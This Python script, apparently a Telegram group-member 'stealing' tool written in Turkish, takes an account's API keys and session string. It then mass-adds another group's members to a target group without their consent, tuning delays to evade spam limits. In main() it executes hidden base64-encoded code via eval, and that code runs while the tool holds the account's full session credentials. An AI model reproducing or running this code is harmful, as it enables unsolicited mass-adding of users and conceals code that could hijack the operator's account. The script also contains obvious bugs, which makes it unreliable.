import asyncio
import base64
from subprocess import PIPE, Popen
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.messages import AddChatUserRequest
from telethon.tl.functions.channels import InviteToChannelRequest
from time import sleep
from android import *
from . import console

def install_pip():
    bilgi(f"redesing telethon beta for cerceynlab")
    pip_cmd = ["pip", "install", "--upgrade","--force-reinstall", "https://github.com/LonamiWebs/Telethon/archive/v1.24.zip"]
    process = Popen(pip_cmd, stdout=PIPE, stderr=PIPE)
    stdout, stderr = process.communicate()
    return stdout

userbot=None
uyecalmaaraligi=8
async def hesabagir ():
    api_id = soru("Hesabınızın API ID'i:")
    try:
        check_api = int(api_id)
    except Exception:
        hata("🛑 API ID Hatalı ! 🛑")

    api_hash = soru("Hesabınızın API HASH'i:")
    if not len(api_hash) >= 30:
        hata("🛑 API HASH Hatalı ! 🛑")

    stringsession = soru("Hesabınızın String'i:")
    if not len(api_hash) >= 30:
        hata("🛑 String Hatalı ! 🛑")

    try:
        userbot = TelegramClient(
        StringSession(stringsession),
        api_id=api_id,
        api_hash=api_hash,
        lang_code="tr",
        device_model='Mac',
        system_version=' | Powered by @cerceyn',
        app_version=str('| 1.0'))
        basarili(api_hash + " için client oluşturuldu !")
    except Exception as e:
        noadded(api_hash + f" için client oluşturulamadı ! 🛑 Hata: {str(e)}")

    try:
        await userbot.connect()
    except Exception as e:
        try:
            await userbot.disconnect()
            await userbot.connect()
        except:
            hata("Bu hesaba giremiyorum! Hata: "+ str(e))
    return userbot
reklamtext="Dikkat! Sadece aktif kullanıları çekebilmek ve yavaş moddan kurtulmak için pro sürümü satın alın."
passs = "4387"
pro=False
async def islemler(userbot):
    onemli("Dikkat! Üye çalacağım grupta bulunmam ve çaldığım üyeleri eklediğim grupta yönetici olmam gerekir..")
    sleep(6)
    logo(True)
    if not pro:
        ads(reklamtext)
    sleep(4)
    calinacakgrup = soru("Üye Çalınacak Grubun kullanıcı adı: (Hangi gruptan üyeleri çekeyim) ")
#    if not calinacakgrup.startswith("@") and not calinacakgrup.startswith("http") and not calinacakgrup.startswith("t.me"):
#        calinacakgrup = "@" + calinacakgrup
    try:
        calinacakgrup = (await userbot.get_entity(calinacakgrup)).id
        count = (await userbot.get_participants(calinacakgrup, limit=1)).total
        bilgi(f"{calinacakgrup} ögesinde {count} kişi bulundu! ")
    except Exception as e:
        hata(e)
    hedefgrup = soru("Çalınan Üyeleri Hangi Gruba Çekeyim: (Grubun kullanıcı adı) ")
#    if not hedefgrup.startswith("@") and not hedefgrup.startswith("http") and not hedefgrup.startswith("t.me"):
#        hedefgrup = "@" + hedefgrup
    try:
        hedefgrup = (await userbot.get_entity(hedefgrup)).id
        count = (await userbot.get_participants(hedefgrup, limit=1)).total
        bilgi(f"Üyeleri çalacağım grubun ({hedefgrup}) üye sayısı {count} kişi ! ")
    except Exception as e:
        hata(e)
    sleep(5)
    logo(True)
    calinamayan=0
    calinan=0
    try:
        bilgi("Hesap koruması nedeniyle her 12+ saniyede bir üye çekme isteğinde bulunmasını ayarlamanızı öneririm...")
        uyecalmaaraligi = soru ("Her üye çalma isteği sonrası ne kadar beklemeli?")
        try:
            uyecalmaaraligi = int(uyecalmaaraligi)
            if uyecalmaaraligi<7:
                bilgi("Damn! Hesabın spam yesin istemem senin için süreyi 14 yapıyorum.")
                uyecalmaaraligi = 14
        except:
            uyecalmaaraligi = 12
        foricin_i=0
        thenextreklam=6
        bilgi("İşlem başlıyor durdurmak için Ctrl+C 'ye basın! Üyelik türü Premium aktif mi: {}".format(str(pro)))
        async for x in userbot.iter_participants(calinacakgrup,100):
            try:
                if foricin_i==thenextreklam:
                    ads(reklamtext + "\nReklam süresi bitene kadar bekleniyor...")
                    sleep(15)
                    thenextreklam=foricin_i+6
                if x.bot:
                    passed("{} bot olduğu için geçiliyor!".format(x.username))
                    continue
                try:
                    await userbot(AddChatUserRequest(
                        hedefgrup,
                        x.id,
                        fwd_limit=10))
                except Exception as s:
                    try:
                        await userbot(InviteToChannelRequest(
                        hedefgrup,
                        [x.id]))
                    except:
                        raise Exception(s)
                basarili("{}({}) gruba başarıyla eklendi!".format(x.first_name,x.id))
                calinan= calinan + 1
            except Exception as e:
                noadded("{}({}) gruba eklenemedi!".format(x.first_name,x.id))
                calinamayan = calinamayan + 1
            sleep(uyecalmaaraligi)
            foricin_i+=1
        console.clear()
        logo()
        basarili(f"İşlem Tamamlandı ! {hedefgrup} ögesine {calinacakgrup} ögesinden toplam {calinan} üye eklendi! ")
        await disconn(userbot)
        hata("Güle Güle !")
    except Exception as e:
        hata(e)

async def main():
    global userbot, pro
    logo(True)
    if not pro:
        ads("Free sürüm! Yavaş Mod ve Reklamlar aktif!")
    eval(compile(base64.b64decode(myscript()),'<string>','exec'))
    userbot = await hesabagir()
    a = True
    while a:
        try:
            await islemler(userbot)
        except Exception as e:
            noadded("Bot bir hata ile karşılaştı: " + e)
        finally:
            cevap= soru("Kod tekrar yürütülsün mü? (y/n)")
            if cevap == "n":
                a = False
                disconn(userbot)
                hata("Güle Güle !")
            else:
                continue
def disconn(userbot):
    try:
        userbot.disconnect()
    except:
        pass

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    try:
        loop.run_until_complete(main())
    except KeyboardInterrupt:
        loop.run_until_complete(disconn(userbot))

   
